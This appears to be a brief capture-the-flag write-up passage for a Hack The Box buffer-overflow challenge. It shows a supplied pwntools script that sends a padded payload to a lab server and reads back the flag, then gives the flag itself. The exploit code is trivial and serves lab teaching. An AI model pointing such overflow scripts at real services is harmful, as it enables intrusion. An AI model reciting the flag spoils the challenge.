They provided a solver script directly:

```python
#!/usr/bin/python3.8

'''
You need to install pwntools to run the script.
To run the script: python3 ./wrapper.py
'''

# Library
from pwn import *

# Open connection
IP   = '165.232.108.236' # Change this
PORT = 30356      # Change this

r    = remote(IP, PORT)

# Craft payload
payload = b'A' * 50 # Change the number of "A"s

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
```
![image](https://user-images.githubusercontent.com/80063008/227555460-fcca80e5-39d2-4b63-978f-48bf52fb301e.png)

HTB{b0f_s33m5_3z_r1ght?}